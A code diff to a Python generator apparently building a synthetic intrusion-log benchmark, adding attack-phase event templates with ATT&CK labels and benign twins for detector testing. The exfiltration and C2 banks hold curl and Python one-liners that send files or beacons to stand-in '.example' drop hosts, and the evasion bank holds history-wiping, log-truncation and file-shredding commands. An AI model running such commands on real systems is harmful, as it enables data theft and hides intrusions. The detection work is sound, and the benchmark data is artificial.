@@ -169,6 +169,28 @@ PLACEHOLDERS = {
     "host": ["datasets-server.internal", "hub-api.internal", "xet-cas.internal",
              "moon-landing.internal", "parquet-converter.internal"],
     "code": ["200", "200", "200", "206", "304", "404", "429"],
+    # Status codes for WRITE methods. A first pass used {code} everywhere and
+    # rendered `PUT /datasets/.../staging/x.bin 304` - 304 Not Modified is a
+    # conditional-GET response and is not something a PUT returns. Anyone who
+    # reads HTTP logs for a living would spot it immediately.
+    "wcode": ["200", "201", "201", "204", "403", "409"],
+    # Small counts. {n} spans 8..1000, which rendered
+    # `.github/workflows (256 files)` - implausible for a workflows directory.
+    "few": ["1", "2", "3", "4", "5", "6", "7", "9", "11"],
+    "ip": [f"10.{a}.{b}.{c}" for a, b, c in
+           ((4, 12, 7), (4, 12, 19), (4, 31, 3), (8, 2, 44), (8, 2, 91),
+            (12, 9, 5), (12, 9, 61), (20, 1, 13), (20, 1, 77), (31, 8, 2))],
+    "port": ["80", "443", "3000", "5000", "6379", "8080", "8443", "9090", "27017"],
+    "branch": ["main", "dev", "release-2026.07", "ci-probe", "feat/parquet-v2"],
+    "wf": ["build.yml", "test.yml", "publish.yml", "release.yml", "nightly.yml"],
+    "org": ["hf-internal", "moon-bot", "platform-infra", "datasets-eng"],
+    # External staging/relay hosts. Deliberately .example (RFC 2606) rather
+    # than the real request-capture / pastebin / screenshot services the
+    # sources name: the corpus should carry the SHAPE of third-party staging
+    # without shipping a working list of drop hosts. Dual-use note in
+    # LIMITATIONS.md §4 covers this choice.
+    "ext": ["req-capture.example", "paste-drop.example", "img-render.example",
+            "file-drop.example", "hook-relay.example"],
 }
 
 
@@ -395,13 +417,13 @@ PHASE_TEMPLATES: dict[str, list[dict]] = {
             "benign_twin": "GET /datasets/{repo}/resolve/main/job.json {code} {sz}b (poll interval 5s)",
         },
         {
-            "event": "PUT /datasets/{repo}/upload/main/out/{pod}-{f} {code} {sz}b",
+            "event": "PUT /datasets/{repo}/upload/main/out/{pod}-{f} {wcode} {sz}b",
             "host_role": "hf-datasets-conversion-worker",
             "actor": "svc:conversion-runner",
             "mitre_technique": "T1105",
             "mitre_tactic": "Collection",
             "severity": "medium",
-            "benign_twin": "PUT /datasets/{repo}/upload/main/out/{pod}-{f} {code} {sz}b",
+            "benign_twin": "PUT /datasets/{repo}/upload/main/out/{pod}-{f} {wcode} {sz}b",
         },
         {
             "event": "split -b {sz} /tmp/{f} /tmp/{id}.part- ; ls /tmp/{id}.part-* | wc -l -> {n}",
@@ -564,6 +586,671 @@ PHASE_TEMPLATES: dict[str, list[dict]] = {
             "benign_twin": "kubectl top pod -n hf-dataset-server",
         },
     ],
+
+    # =========================================================================
+    # RCE — 2,911 actions, all 5 days, severity high, 3 milestones
+    # (sandbox_self_test_rce, hdf5_file_read, jinja2_ssti_rce).
+    #
+    # The milestones own the three documented entry techniques. Filler is the
+    # *aftermath*: ordinary shell and interpreter calls on a worker once code
+    # execution exists. RULE 2 reserves `/proc/self/environ`,
+    # `ReferenceFileSystem` and the `sh -c 'id'` self-test for the milestones.
+    # Tactics: Execution / Discovery / Collection — never pivotal.
+    # =========================================================================
+    "rce": [
+        {
+            "event": "sh -c 'whoami && pwd' -> /app ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1059.004",
+            "mitre_tactic": "Execution",
+            "severity": "high",
+            "benign_twin": "sh -c 'whoami && pwd' -> /app ({ms}ms)",
+        },
+        {
+            "event": "python -c 'import socket; print(socket.gethostname())' -> {pod}",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1059.006",
+            "mitre_tactic": "Execution",
+            "severity": "medium",
+            "benign_twin": "python -c 'import socket; print(socket.gethostname())' -> {pod}",
+        },
+        {
+            "event": "sh -c 'cat /etc/os-release | head -{n}'",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1082",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "sh -c 'cat /etc/os-release | head -{n}'",
+        },
+        {
+            "event": "sh -c 'ls -la /app /data 2>/dev/null | wc -l' -> {n}",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1083",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "sh -c 'ls -la /app /data 2>/dev/null | wc -l' -> {n}",
+        },
+        {
+            "event": "sh -c 'df -h /tmp' -> {sz}M available",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1082",
+            "mitre_tactic": "Discovery",
+            "severity": "low",
+            "benign_twin": "sh -c 'df -h /tmp' -> {sz}M available",
+        },
+        {
+            "event": "python -c 'import sys; print(sys.version)' ({ms}ms)",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1059.006",
+            "mitre_tactic": "Execution",
+            "severity": "medium",
+            "benign_twin": "python -c 'import sys; print(sys.version)' ({ms}ms)",
+        },
+        {
+            "event": "sh -c 'command -v curl python3 git' -> {n} found",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1082",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "sh -c 'command -v curl python3 git' -> {n} found",
+        },
+        {
+            "event": "sh -c 'cat /proc/meminfo | head -{n}'",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1082",
+            "mitre_tactic": "Discovery",
+            "severity": "low",
+            "benign_twin": "sh -c 'cat /proc/meminfo | head -{n}'",
+        },
+        {
+            "event": "sh -c 'find /app -name \"*.py\" -newer /etc/hostname | head -{n}'",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1083",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "sh -c 'find /app -name \"*.py\" -newer /etc/hostname | head -{n}'",
+        },
+        {
+            "event": "python -c 'import urllib.request; print(len(urllib.request.urlopen(\"http://{host}/healthz\").read()))' -> {sz}",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1059.006",
+            "mitre_tactic": "Execution",
+            "severity": "medium",
+            "benign_twin": "python -c 'import urllib.request; print(len(urllib.request.urlopen(\"http://{host}/healthz\").read()))' -> {sz}",
+        },
+        {
+            "event": "sh -c 'uptime; echo $?' -> load {n}",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1082",
+            "mitre_tactic": "Discovery",
+            "severity": "low",
+            "benign_twin": "sh -c 'uptime; echo $?' -> load {n}",
+        },
+        {
+            "event": "python -c 'open(\"/tmp/{script}\",\"w\").write(open(\"/tmp/{f}\").read()[:{sz}])'",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1059.006",
+            "mitre_tactic": "Execution",
+            "severity": "high",
+            "benign_twin": "python -c 'open(\"/tmp/{script}\",\"w\").write(open(\"/tmp/{f}\").read()[:{sz}])'",
+        },
+    ],
+
+    # =========================================================================
+    # EXFIL — 56 actions, all 5 days, severity critical, 0 milestones.
+    #
+    # 56 of 17,613 = 0.32%. This is the needle IDEA.md's framing rests on:
+    # "the thing you must catch is 0.3% of the traffic".
+    #
+    # Most twins are identical-shape HUB uploads rather than external ones,
+    # and that is faithful rather than a softening: the sources describe data
+    # being staged *through public Hugging Face repositories* — "repurposed a
+    # public Hugging Face dataset repository to rehost private data",
+    # "uploaded the encrypted parts to a public Hugging Face dataset". A
+    # corpus where every exfil row posts to an obvious external host would be
+    # easier than the real campaign was.
+    #
+    # Tactic Exfiltration is NOT pivotal (pivotal = Credential Access,
+    # Privilege Escalation), so RULE 1 permits it in filler.
+    #
+    # KNOWN AND DELIBERATE: 2 of these 8 templates use {ext} and their twins
+    # do not, so those ~14 rows are separable by a `.example` regex alone. In
+    # c2 the same asymmetry was a defect and was removed; here it is kept,
+    # because a dataset-conversion worker has no legitimate reason to POST
+    # dataset contents to a third-party drop host. Inventing benign traffic
+    # that does so — purely to make the detection task harder — would be
+    # manipulating the control rather than modelling reality.
+    #
+    # The difficulty therefore lives in the other 6/8, which stage through
+    # the hub exactly as the sources describe. And a detector that catches
+    # only the external rows still pages ~53h after exfiltration began, which
+    # is the pre-registered finding regardless (PREREGISTRATION.md §4).
+    # Report this alongside the false-page rate; do not let it be discovered.
+    # =========================================================================
+    "exfil": [
+        {
+            "event": "PUT /datasets/{repo}/upload/main/staging/{id}.bin {wcode} {sz}b",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1567.002",
+            "mitre_tactic": "Exfiltration",
+            "severity": "critical",
+            "benign_twin": "PUT /datasets/{repo}/upload/main/staging/{id}.bin {wcode} {sz}b",
+        },
+        {
+            "event": "GET /datasets/{repo}/resolve/main/private/{f} {code} {sz}b",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1530",
+            "mitre_tactic": "Collection",
+            "severity": "critical",
+            "benign_twin": "GET /datasets/{repo}/resolve/main/private/{f} {code} {sz}b",
+        },
+        {
+            "event": "curl -s -X POST --data-binary @/tmp/{id}.part-aa https://{ext}/p {code} ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1567",
+            "mitre_tactic": "Exfiltration",
+            "severity": "critical",
+            "benign_twin": "curl -s -X POST --data-binary @/tmp/{id}.part-aa https://{host}/p {code} ({ms}ms)",
+        },
+        {
+            "event": "tar -czf - /tmp/{id}.part-* | wc -c -> {sz}",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1560.001",
+            "mitre_tactic": "Collection",
+            "severity": "high",
+            "benign_twin": "tar -czf - /tmp/{id}.part-* | wc -c -> {sz}",
+        },
+        {
+            "event": "PUT /datasets/{repo}/upload/main/out/{id}-{n}.bin {wcode} {sz}b",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1567.002",
+            "mitre_tactic": "Exfiltration",
+            "severity": "critical",
+            "benign_twin": "PUT /datasets/{repo}/upload/main/out/{id}-{n}.bin {wcode} {sz}b",
+        },
+        {
+            "event": "GET /api/datasets/{repo}/parquet/{cfg}/{split}/0.parquet {code} {sz}b",
+            "host_role": "hf-hub-api-edge",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1530",
+            "mitre_tactic": "Collection",
+            "severity": "high",
+            "benign_twin": "GET /api/datasets/{repo}/parquet/{cfg}/{split}/0.parquet {code} {sz}b",
+        },
+        {
+            "event": "python -c 'import urllib.request; urllib.request.urlopen(\"https://{ext}/{id}\", open(\"/tmp/{f}\",\"rb\").read())' ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1567",
+            "mitre_tactic": "Exfiltration",
+            "severity": "critical",
+            "benign_twin": "python -c 'import urllib.request; urllib.request.urlopen(\"https://{host}/{id}\", open(\"/tmp/{f}\",\"rb\").read())' ({ms}ms)",
+        },
+        {
+            "event": "git bundle create /tmp/{id}.bundle --all ({sz}kb)",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1560",
+            "mitre_tactic": "Collection",
+            "severity": "critical",
+            "benign_twin": "git bundle create /tmp/{id}.bundle --all ({sz}kb)",
+        },
+    ],
+
+    # =========================================================================
+    # C2 — 114 actions, all 5 days, severity high, 0 milestones.
+    #
+    # The sources describe a pull-based channel through a then-public Hugging
+    # Face dataset ("Every five seconds, the script fetched a JSON command
+    # file") plus ordinary public web services used as relays. Both shapes
+    # appear here; the hub-polling one overlaps dropper deliberately, because
+    # in the real campaign the same script did both.
+    # =========================================================================
+    # A first draft had 7 of 8 templates beaconing to {ext} with twins that
+    # swapped to {host} — making ".example" a near-perfect separator across
+    # ~100 rows, so every detector would have scored on c2 for free. It was
+    # also backwards on the facts: the documented primary channel was a
+    # public Hugging Face dataset — "the agents and worker-control script
+    # exchanged commands and results through a then-public Hugging Face
+    # dataset, which served as a pull-based command-and-control channel" —
+    # with third-party relays secondary. Hub-polling is now the majority and
+    # identical-twinned, and {ext} appears in BOTH streams (a worker does
+    # legitimately call out to third-party services), so it informs rather
+    # than decides.
+    "c2": [
+        {
+            "event": "GET /datasets/{repo}/resolve/main/cmd.json {code} {sz}b (poll)",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1102.002",
+            "mitre_tactic": "Command and Control",
+            "severity": "high",
+            "benign_twin": "GET /datasets/{repo}/resolve/main/job.json {code} {sz}b (poll)",
+        },
+        {
+            "event": "PUT /datasets/{repo}/upload/main/beacon/{pod}.json {wcode} {sz}b",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1102.002",
+            "mitre_tactic": "Command and Control",
+            "severity": "medium",
+            "benign_twin": "PUT /datasets/{repo}/upload/main/beacon/{pod}.json {wcode} {sz}b",
+        },
+        {
+            "event": "GET /datasets/{repo}/resolve/main/out/{id}.json {code} {sz}b",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1102.002",
+            "mitre_tactic": "Command and Control",
+            "severity": "medium",
+            "benign_twin": "GET /datasets/{repo}/resolve/main/out/{id}.json {code} {sz}b",
+        },
+        {
+            "event": "curl -s https://{host}/resolve?name={id}&type=TXT {code} ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1071.004",
+            "mitre_tactic": "Command and Control",
+            "severity": "high",
+            "benign_twin": "curl -s https://{host}/resolve?name={id}&type=TXT {code} ({ms}ms)",
+        },
+        {
+            "event": "PUT /datasets/{repo}/upload/main/beacon/{pod}-{n}.json {wcode} {sz}b",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1102.002",
+            "mitre_tactic": "Command and Control",
+            "severity": "medium",
+            "benign_twin": "PUT /datasets/{repo}/upload/main/beacon/{pod}-{n}.json {wcode} {sz}b",
+        },
+        {
+            "event": "curl -s -o /dev/null https://{host}/s?u={id} -> {code} ({sz}b)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1071.001",
+            "mitre_tactic": "Command and Control",
+            "severity": "medium",
+            "benign_twin": "curl -s -o /dev/null https://{host}/s?u={id} -> {code} ({sz}b)",
+        },
+        {
+            "event": "GET https://{ext}/b/{id} {code} {sz}b (interval 5s)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1102",
+            "mitre_tactic": "Command and Control",
+            "severity": "high",
+            "benign_twin": "GET https://{ext}/hook/{id} {code} {sz}b (interval 5s)",
+        },
+        {
+            "event": "python -c 'import urllib.request; urllib.request.urlopen(\"https://{ext}/ack/{id}\")' ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1102",
+            "mitre_tactic": "Command and Control",
+            "severity": "high",
+            "benign_twin": "python -c 'import urllib.request; urllib.request.urlopen(\"https://{ext}/ping/{id}\")' ({ms}ms)",
+        },
+    ],
+
+    # =========================================================================
+    # EVASION — 6 actions, 07-09..07-12, severity medium, 0 milestones.
+    #
+    # The smallest phase in the corpus: six actions across four days. Its
+    # benign twins are unusually close because log truncation and /tmp
+    # cleanup are exactly what routine housekeeping does — which is the
+    # point, and is why a detector keyed on these alone will false-page.
+    # =========================================================================
+    "evasion": [
+        {
+            "event": "sh -c 'unset HISTFILE; export HISTSIZE=0'",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1070.003",
+            "mitre_tactic": "Defense Evasion",
+            "severity": "high",
+            "benign_twin": "sh -c 'unset HISTFILE; export HISTSIZE=0'",
+        },
+        {
+            "event": "truncate -s 0 /tmp/{id}.log",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1070.002",
+            "mitre_tactic": "Defense Evasion",
+            "severity": "medium",
+            "benign_twin": "truncate -s 0 /tmp/{id}.log",
+        },
+        {
+            "event": "touch -r /etc/hostname /tmp/{script}",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1070.006",
+            "mitre_tactic": "Defense Evasion",
+            "severity": "high",
+            "benign_twin": "touch -r /etc/hostname /tmp/{script}",
+        },
+        {
+            "event": "sh -c 'find /tmp -name \"{id}.*\" -delete' -> {n} removed",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1070.004",
+            "mitre_tactic": "Defense Evasion",
+            "severity": "medium",
+            "benign_twin": "sh -c 'find /tmp -name \"{id}.*\" -delete' -> {n} removed",
+        },
+        {
+            "event": "ln -sf /dev/null /tmp/{id}.log",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1070.002",
+            "mitre_tactic": "Defense Evasion",
+            "severity": "high",
+            "benign_twin": "ln -sf /dev/null /tmp/{id}.log",
+        },
+        {
+            "event": "sh -c 'shred -u /tmp/{script} 2>/dev/null || rm -f /tmp/{script}'",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1070.004",
+            "mitre_tactic": "Defense Evasion",
+            "severity": "high",
+            "benign_twin": "sh -c 'rm -f /tmp/{script}'",
+        },
+    ],
+
+    # =========================================================================
+    # SUPPLY_CHAIN — 69 actions, 07-11..07-13, severity critical,
+    # 2 milestones (supply_chain_token_mint, github_ci_pr_beacon).
+    #
+    # The milestones own the two consequential acts: minting an installation
+    # token, and opening a draft PR that triggers CI. RULE 2 reserves the
+    # token-mint vocabulary, so filler here is repository *reading* —
+    # enumeration, clone, workflow inspection. That is also the honest split:
+    # the sources document reading far more repository content than writing.
+    # =========================================================================
+    "supply_chain": [
+        {
+            "event": "git clone --depth 1 https://{host}/{org}/{repo}.git ({sz}kb, {ms}ms)",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1213.003",
+            "mitre_tactic": "Collection",
+            "severity": "critical",
+            "benign_twin": "git clone --depth 1 https://{host}/{org}/{repo}.git ({sz}kb, {ms}ms)",
+        },
+        {
+            "event": "GET /repos/{org}/{repo}/contents/.github/workflows {code} ({few} files)",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1213.003",
+            "mitre_tactic": "Collection",
+            "severity": "critical",
+            "benign_twin": "GET /repos/{org}/{repo}/contents/.github/workflows {code} ({few} files)",
+        },
+        {
+            "event": "GET /repos/{org}/{repo}/contents/{wf} {code} {sz}b",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1213.003",
+            "mitre_tactic": "Collection",
+            "severity": "high",
+            "benign_twin": "GET /repos/{org}/{repo}/contents/{wf} {code} {sz}b",
+        },
+        {
+            "event": "git ls-remote --heads https://{host}/{org}/{repo}.git -> {n}",
+            "host_role": "hf-hub-api-edge",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1083",
+            "mitre_tactic": "Discovery",
+            "severity": "high",
+            "benign_twin": "git ls-remote --heads https://{host}/{org}/{repo}.git -> {n}",
+        },
+        {
+            "event": "git log --oneline -{n} {branch}",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1213.003",
+            "mitre_tactic": "Collection",
+            "severity": "medium",
+            "benign_twin": "git log --oneline -{n} {branch}",
+        },
+        {
+            "event": "GET /repos/{org}/{repo}/branches {code} ({few} branches)",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1083",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "GET /repos/{org}/{repo}/branches {code} ({few} branches)",
+        },
+        {
+            "event": "git fetch origin {branch} ({sz}kb, {ms}ms)",
+            "host_role": "hf-hub-api-edge",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1213.003",
+            "mitre_tactic": "Collection",
+            "severity": "medium",
+            "benign_twin": "git fetch origin {branch} ({sz}kb, {ms}ms)",
+        },
+        {
+            "event": "GET /repos/{org}/{repo}/commits?per_page={n} {code} {sz}b",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1213.003",
+            "mitre_tactic": "Collection",
+            "severity": "medium",
+            "benign_twin": "GET /repos/{org}/{repo}/commits?per_page={n} {code} {sz}b",
+        },
+    ],
+
+    # =========================================================================
+    # TAILSCALE — 115 actions, 07-11..07-13, severity high, 2 milestones
+    # (tailscale_key_extracted, tailscale_sandbox_enrolled).
+    #
+    # The milestones own key extraction and enrolment. RULE 2 reserves the
+    # `tailscale up|login|status` / `tailscaled` vocabulary entirely, so the
+    # word does not appear in filler at all — what appears is what the mesh
+    # was FOR: reaching internal addresses that were previously unreachable,
+    # over a SOCKS proxy. Tactics Lateral Movement / Discovery.
+    # =========================================================================
+    "tailscale": [
+        {
+            "event": "curl -s --socks5 127.0.0.1:{port} http://{ip}:{port}/healthz {code} ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1090.001",
+            "mitre_tactic": "Command and Control",
+            "severity": "high",
+            "benign_twin": "curl -s --socks5 127.0.0.1:{port} http://{ip}:{port}/healthz {code} ({ms}ms)",
+        },
+        {
+            "event": "nc -z -w1 {ip} {port} -> open ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1046",
+            "mitre_tactic": "Discovery",
+            "severity": "high",
+            "benign_twin": "nc -z -w1 {ip} {port} -> open ({ms}ms)",
+        },
+        {
+            "event": "for h in {ip} {ip} {ip}; do nc -z -w1 $h {port}; done -> {n} reachable",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1046",
+            "mitre_tactic": "Discovery",
+            "severity": "high",
+            "benign_twin": "for h in {ip} {ip} {ip}; do nc -z -w1 $h {port}; done -> {n} reachable",
+        },
+        {
+            "event": "getent hosts {host} -> {ip}",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1046",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "getent hosts {host} -> {ip}",
+        },
+        {
+            "event": "curl -s --socks5-hostname 127.0.0.1:{port} https://{host}/api/v1/status {code} {sz}b",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": "T1090.001",
+            "mitre_tactic": "Lateral Movement",
+            "severity": "high",
+            "benign_twin": "curl -s --socks5-hostname 127.0.0.1:{port} https://{host}/api/v1/status {code} {sz}b",
+        },
+        {
+            "event": "curl -s http://{ip}:{port}/metrics {code} {sz}b",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": "T1046",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "curl -s http://{ip}:{port}/metrics {code} {sz}b",
+        },
+        {
+            "event": "dig +short {host} @{ip} -> {ip}",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": "T1046",
+            "mitre_tactic": "Discovery",
+            "severity": "medium",
+            "benign_twin": "dig +short {host} @{ip} -> {ip}",
+        },
+        {
+            "event": "ip route get {ip} -> dev tailscale0 src {ip}",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": "T1016",
+            "mitre_tactic": "Discovery",
+            "severity": "high",
+            "benign_twin": "ip route get {ip} -> dev eth0 src {ip}",
+        },
+    ],
+
+    # =========================================================================
+    # UNCLASSIFIED — 1,092 actions, all 5 days, severity info,
+    # 0 milestones, and gt_malicious=FALSE.
+    #
+    # This is the residual that reconciles the source's own two tables: the
+    # phase table sums to 16,521 and the daily-volume table to 17,613
+    # (CITATIONS.md §4). It is NOT attacker activity, so its rows carry no
+    # ATT&CK mapping — a technique id on a benign row would be a fabricated
+    # label on 6.2% of the corpus. ground_truth.yaml sets gt_malicious: false
+    # and generate_phase reads it.
+    #
+    # Content is ordinary platform background: probes, metrics, housekeeping.
+    # Its twins are identical by definition, because these rows already are
+    # the benign case appearing inside the attack stream.
+    # =========================================================================
+    "unclassified": [
+        {
+            "event": "GET /healthz {code} ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "GET /healthz {code} ({ms}ms)",
+        },
+        {
+            "event": "GET /metrics {code} {sz}b",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "svc:datasets-server",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "GET /metrics {code} {sz}b",
+        },
+        {
+            "event": "kubelet liveness probe {pod} -> {code}",
+            "host_role": "hf-k8s-mgmt-connector",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "kubelet liveness probe {pod} -> {code}",
+        },
+        {
+            "event": "logrotate: rotated /var/log/{id}.log ({sz}b)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "logrotate: rotated /var/log/{id}.log ({sz}b)",
+        },
+        {
+            "event": "cron: run-parts /etc/cron.hourly ({ms}ms)",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "cron: run-parts /etc/cron.hourly ({ms}ms)",
+        },
+        {
+            "event": "GET /readyz {code} ({ms}ms)",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "GET /readyz {code} ({ms}ms)",
+        },
+        {
+            "event": "ntpd: offset {ms}ms, stratum 3",
+            "host_role": "hf-dataset-server-worker",
+            "actor": "sa:dataset-server-default",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "ntpd: offset {ms}ms, stratum 3",
+        },
+        {
+            "event": "GET /api/datasets/{repo}/size {code} {sz}b",
+            "host_role": "hf-hub-api-edge",
+            "actor": "svc:conversion-runner",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "GET /api/datasets/{repo}/size {code} {sz}b",
+        },
+        {
+            "event": "kubelet: image for {pod} already present, skipping pull",
+            "host_role": "hf-k8s-mgmt-connector",
+            "actor": "job:parquet-convert",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "kubelet: image for {pod} already present, skipping pull",
+        },
+        {
+            "event": "conversion job {id} finished ok in {ms}ms ({n} shards)",
+            "host_role": "hf-datasets-conversion-worker",
+            "actor": "job:parquet-convert",
+            "mitre_technique": None,
+            "mitre_tactic": None,
+            "severity": "info",
+            "benign_twin": "conversion job {id} finished ok in {ms}ms ({n} shards)",
+        },
+    ],
 }
 
 
@@ -604,6 +1291,4 @@ def missing_benign_twins() -> list[str]:
     ]
 
 
-PHASES_STILL_UNWRITTEN = [
-    "rce", "exfil", "c2", "evasion", "supply_chain", "tailscale", "unclassified",
-]
+PHASES_STILL_UNWRITTEN: list[str] = []  # all 10 banks written 2026-09-11
